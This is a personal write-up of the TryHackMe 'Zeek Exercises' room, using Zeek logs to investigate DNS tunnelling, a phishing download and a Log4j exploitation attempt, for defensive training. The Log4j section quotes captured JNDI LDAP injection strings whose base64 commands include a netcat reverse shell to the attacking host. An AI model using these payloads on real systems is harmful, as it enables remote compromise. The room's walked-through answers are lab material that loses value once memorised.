---
parent: "[[CTFs - THM]]"
resources:
---

```bash
# PLATFORM          . THM 
# CTF NAME          . Zeek Exercises
# DESCRIPTION       . Put your Zeek skills into practice and analyse network traffic.
# DIFFICULTY        . Medium
# CTF LINK          . https://tryhackme.com/r/room/zeekbroexercises
```

# ANOMALOUS DNS 
## An alert triggered: "Anomalous DNS Activity".

### Investigate the **dns-tunneling.pcap** file. Investigate the **dns.log** file. What is the number of DNS records linked to the IPv6 address?

- The IPv6 are using AAAA dns requests, so I decided to see how many AAAA records are in the log.

```
cat dns.log | grep AAAA | wc -l
```

### Investigate the **conn.log** file. What is the longest connection duration?

- After analising the header of the `conn.log` to see what fields are available, i found the answer using

```
cat conn.log | zeek-cut duration | sort -r | head -1
```

### Investigate the **dns.log** file. Filter all unique DNS queries. What is the number of unique domain queries?

```
cat dns.log | zeek-cut query | rev | cut -d '.' -f1-2 | rev | sort | uniq 
```

- Cut the `query` field from `dns.log`, then reverse the content and separate the fields by `.` and print only the first and second fields (`cut -d '.' -f1-2`)
- Then, reverse again (so it's written normal), `sort` and eliminate duplicates (`uniq`)

- Pipe an additional `wc -l` at the end of the command if you want to get the exact number of unique domains --- the comand above lists only them. 

### There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the **conn.log** file. What is the IP address of the source host?

- A simple `cat conn.log` file will be enough.

- However, I wanted to count the number of each occurences for each IP since I felt like it was too easy this way.
- I quickly found out that this is useless

```
cat conn.log | zeek-cut id.orig_h | sort | uniq

10.20.57.3
fe80::202a:f0b1:7d9c:bd93
```

- We only have 2 IPs, and we care about the IPv4 one.

# PHISHING

## An alert triggered: "Phishing Attempt".

### Investigate the logs. What is the suspicious source address? Enter your answer in **defanged format**.

- I took a look around the logs.  By checking `http.log`, I found that `/Documents/Invoice&MSO-Request.doc` and `knr.exe` were downloaded from `smart-fax.com` whose IP is `10.6.27.102`.

### Investigate the **http.log** file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.

- Answered above :) 

### Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?

- I've read the hint since I couldn't find anything helpful in the log files.
- The hint also suggested that I should check the hash of the files, which I already tried, but they're missing from log files.
- Fun fact, I even tried accessing the website from TOR to download the files, but it's access forbidden from TOR. :)  
- However, I then realised there's a hash-demo.zeek file and I've used it in the following commnad

```
zeek -C -r phishing.pcap hash-demo.zeek
```

- Then, inside the `files.log`, I could find the hashes for the files.
- By searching the `.doc`'s file hash on VT and navigating to relations tab, we can find the answer to this question.

### Investigate the extracted malicious **.exe** file. What is the given file name in Virustotal?

- The name is under the hash in the upper header, where the number of detections and the community score is shown.

### Investigate the malicious **.exe** file in VirusTotal. What is the contacted domain name? Enter your answer in **defanged format**.

- Can be found in the Community tab. Take only the domain.TLD, not the subdomain.domain.TLD

### Investigate the http.log file. What is the request name of the downloaded malicious **.exe** file?

- Answered in the first question.

# LOG4J

## **An alert triggered:** "Log4J Exploitation Attempt".

### Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?

- The answer is the number of lines in the file. :) 

### Investigate the **http.log** file. Which tool is used for scanning?

- Check the user agent :) 

### Investigate the **http.log** file. What is the extension of the exploit file?

- Take a look at the `uri` column. We can filter the unique values by using

```
cat http.log | zeek-cut uri | uniq
```

- The answer is clear from the output of the command above.

### Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?

- I took a shorcut here and grepped the content by `==`.

```
cat log4j.log | grep == 
```

```
1640025554.661073	CXWBTu1EqLrSi8l38i	/	192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==	192.168.56.102:389	192.168.56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}	F	T

1640026858.960398	CTWSGr3MDPIcJqo5H1	/	192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==	192.168.56.102:389	192.168.56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==}	F	T
```

- One of these base64 strings holds the answer. Decode them :) 

